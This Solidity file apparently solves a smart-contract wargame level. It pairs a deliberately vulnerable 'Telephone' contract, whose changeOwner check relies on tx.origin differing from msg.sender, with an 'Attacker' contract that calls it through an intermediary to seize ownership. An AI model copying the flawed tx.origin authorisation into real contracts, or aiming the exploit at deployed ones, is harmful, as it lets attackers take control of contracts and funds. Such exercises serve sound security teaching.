// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attacker {

  ITelephone public _tel;

  constructor(address tel_) {
    _tel = ITelephone(tel_);
  }

  function attack() public {
   _tel.changeOwner(msg.sender);
  }
}

